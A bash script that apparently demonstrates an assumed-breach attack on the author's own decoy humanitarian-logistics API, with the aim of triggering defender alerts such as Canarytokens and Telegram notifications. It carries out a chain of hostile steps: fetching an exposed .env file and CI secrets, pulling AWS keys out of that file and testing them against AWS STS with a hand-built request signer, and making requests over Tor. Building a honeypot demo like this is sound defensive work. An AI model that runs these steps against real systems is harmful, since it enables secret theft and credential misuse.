#!/usr/bin/env bash
# Assumed-breach demo against the HLP logistics tarpit.
# Safe: only hits OUR decoy API + OUR Canarytoken. Do not point this at other hosts.
set -euo pipefail

API="${API:-http://18.171.222.41}"
PAUSE="${PAUSE:-1.2}"

banner() {
  printf '\n\033[1;31m==> %s\033[0m\n' "$1"
  sleep "$PAUSE"
}

banner "Phase 1 — internet recon on exposed humanitarian API"
curl -sS -D - "$API/" -o /tmp/hlp-root.json | sed -n '1,12p'
python3 -m json.tool /tmp/hlp-root.json | head -n 30

banner "Phase 2 — health + shipment dump (unauthenticated)"
curl -sS "$API/health" | python3 -m json.tool
curl -sS "$API/v1/shipments" | python3 -m json.tool | head -n 40

banner "Phase 3 — secret harvest (.env + CI secrets)"
curl -sS "$API/.env" | tee /tmp/hlp.env
echo
curl -sS "$API/v1/ci/secrets" | python3 -m json.tool

banner "Phase 4 — stolen IAM keys against AWS (Canarytoken tripwire)"
# Keys come from the leaked .env (Canarytoken), not from this machine's real AWS profile.
set +e
AWS_ACCESS_KEY_ID="$(awk -F= '/^AWS_ACCESS_KEY_ID=/{print $2}' /tmp/hlp.env)"
AWS_SECRET_ACCESS_KEY="$(awk -F= '/^AWS_SECRET_ACCESS_KEY=/{print $2}' /tmp/hlp.env)"
AWS_DEFAULT_REGION="$(awk -F= '/^AWS_DEFAULT_REGION=/{print $2}' /tmp/hlp.env)"
export AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_DEFAULT_REGION
export AWS_PAGER=""
if command -v aws >/dev/null 2>&1; then
  aws sts get-caller-identity --region "${AWS_DEFAULT_REGION:-us-east-2}" 2>&1 | head -n 20
else
  python3 - <<'PY'
import datetime, hashlib, hmac, os, urllib.request
ak, sk = os.environ["AWS_ACCESS_KEY_ID"], os.environ["AWS_SECRET_ACCESS_KEY"]
region = os.environ.get("AWS_DEFAULT_REGION") or "us-east-2"
service, host = "sts", "sts.amazonaws.com"
now = datetime.datetime.utcnow()
amzdate, datestamp = now.strftime("%Y%m%dT%H%M%SZ"), now.strftime("%Y%m%d")
payload = "Action=GetCallerIdentity&Version=2011-06-15"
payload_hash = hashlib.sha256(payload.encode()).hexdigest()
canonical = f"POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:{host}\nx-amz-date:{amzdate}\n\ncontent-type;host;x-amz-date\n{payload_hash}"
scope = f"{datestamp}/{region}/{service}/aws4_request"
string_to_sign = f"AWS4-HMAC-SHA256\n{amzdate}\n{scope}\n{hashlib.sha256(canonical.encode()).hexdigest()}"

def sign(key, msg):
    return hmac.new(key, msg.encode(), hashlib.sha256).digest()
k = sign(sign(sign(sign(("AWS4"+sk).encode(), datestamp), region), service), "aws4_request")
sig = hmac.new(k, string_to_sign.encode(), hashlib.sha256).hexdigest()
auth = f"AWS4-HMAC-SHA256 Credential={ak}/{scope}, SignedHeaders=content-type;host;x-amz-date, Signature={sig}"
req = urllib.request.Request(
    f"https://{host}/",
    data=payload.encode(),
    method="POST",
    headers={
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "X-Amz-Date": amzdate,
        "Authorization": auth,
    },
)
try:
    print(urllib.request.urlopen(req, timeout=20).read().decode()[:800])
except Exception as exc:
    print(exc)
    if hasattr(exc, "read"):
        print(exc.read().decode()[:800])
PY
fi
set -e

banner "Phase 5 — Tor anonymity test (own decoy API only)"
echo "Confirmed Tor exits should now get HTTP 403 ANON_NETWORK_BLOCKED (policy HLP-SEC-ANON-01)."
set +e
TOR_SOCKS=""
for port in 9050 9150; do
  if (echo >/dev/tcp/127.0.0.1/$port) >/dev/null 2>&1; then
    TOR_SOCKS="127.0.0.1:${port}"
    break
  fi
done
if [[ -z "$TOR_SOCKS" ]]; then
  echo "[skip] No Tor SOCKS on 9050/9150."
  echo "        Kali: sudo apt-get install -y tor && sudo systemctl start tor"
  echo "        Then re-run, or: curl --socks5-hostname 127.0.0.1:9050 -sS -D - $API/health"
else
  echo "Using Tor SOCKS $TOR_SOCKS"
  if curl -sS --connect-timeout 15 --max-time 40 \
    --socks5-hostname "$TOR_SOCKS" \
    -A "HLP-demo-tor/1.0" \
    -D - \
    "$API/health" -o /tmp/hlp-tor-body.json
  then
    echo "--- body ---"
    python3 -m json.tool /tmp/hlp-tor-body.json 2>/dev/null || cat /tmp/hlp-tor-body.json
    echo
    echo "Expect 403 + ANON_NETWORK_BLOCKED. Telegram should flag TOR exit + policy block."
  else
    echo "[skip] Tor circuit failed (common if Tor is still bootstrapping). Retry in 30s."
  fi
fi
set -e

banner "Phase 6 — AI tarpit: keep the scanner in an admin/CI loop"
echo "(LLM catch-all — 12s cap per request, script continues on timeout)"
set +e
for path in \
  "/v1/admin/jobs?override=true" \
  "/v1/ci/pipelines" \
  "/v1/aid-requests?status=P0"
do
  echo
  echo "GET $path"
  if ! curl -sS --connect-timeout 5 --max-time 12 "$API$path" -o /tmp/hlp-llm.json; then
    echo "[timeout/skip] OpenRouter did not answer in time — tarpit still engaged, moving on"
    continue
  fi
  python3 -c 'print(open("/tmp/hlp-llm.json").read()[:700])'
done
set -e

banner "Done. Check Telegram: geo + GreyNoise + Tor/VPN line, then Canary CRITICAL if Phase 4 fired."
echo "Split-screen: this terminal (attacker) | phone Telegram (defender)."
